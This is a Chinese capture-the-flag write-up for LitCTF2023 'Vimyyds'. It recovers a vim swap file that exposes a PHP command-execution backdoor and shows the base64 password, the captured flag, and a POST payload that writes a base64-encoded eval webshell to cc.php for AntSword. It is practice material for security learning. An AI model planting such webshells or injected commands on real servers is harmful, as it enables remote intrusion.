---
title: "Web 6 [LitCTF2023]Vimyyds"
published: 2024-12-01
category: CTF
---

> [!TIP]
>
>
> 题目涉及vim，并且说泄露了

![](https://pic.npiter.de/file/1771547725487_20260220083518079.png)

搜索相关资料得到

### Vim泄露知识

![](https://pic.npiter.de/file/1771547725720_20260220083518077.png)

因此我们的切入点来了

> [!tip]
>
>
> 尝试访问==.index.php.swp==

Windows电脑上的vim不太好用，我是说有点麻烦，不太好操作

### 使用kali系统用vim来操作

![](https://pic.npiter.de/file/1771547731593_20260220083518080.png)

访问后会下载相应的文件，我们使用vim打开

> 打开终端

![](https://pic.npiter.de/file/1771547742059_20260220083518081.png)

输入

```
vim -r index.php.swp

```

![](https://pic.npiter.de/file/1771547747759_20260220083518082.png)

得到

```



        body,
        html {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        div.vim {
            display: flex;
            align-content: center;
            vertical-align: middle;
            justify-content: center;
        }

        img {
            border: none;
            width: 8rem;
            height: auto;
        }

        h1.vim_yyds {
            color: #50f728;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            margin-top: 50;
            margin-left: 5px;
        }

        h3.vim_said {
            color: #39c2ff;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        br,
        p {
            font-size: 20;
        }






                Vim yyds



            队里师傅说Vim是世界上最好的编辑器，不接受反驳


            can can need Vim ";
            if ($_POST['password'] === base64_encode($password)) {
                echo "Oh You got my password!";
                eval(system($_POST['cmd']));
            }
            ?>



```

### 找到有用的东西在后面的password

![](https://pic.npiter.de/file/1771547755547_20260220083518084.png)

> [!IMPORTANT]
>
>
> 可以通过hackbar来post参数，这里的意思是我们要将**Give_Me_Your_Flag**转为base64将password发送

![](https://pic.npiter.de/file/1771547752996_20260220083518083.png)

> 第一次尝试出问题

![](https://pic.npiter.de/file/1771547755929_20260220083518085.png)

> 重新传一遍

![](https://pic.npiter.de/file/1771547764977_20260220083518086.png)

### 得到flag

**NSSCTF{c39b484e-3955-43a2-b57e-1768857cae2c}**

### 别的师傅的方法，使用蚁剑

写入webshell：

```php

PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==

echo "PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==" | base64 -d >cc.php

password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=echo "PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==" | base64 -d >cc.php

```

蚁剑连接：http://node6.anna.nssctf.cn:28516/cc.php 密码为cc

我尝试的过程中上传不了webshell，不知道为啥

## 总结

- 学会vim的常见泄露知识

- 使用hackbar来方便的发送post请求
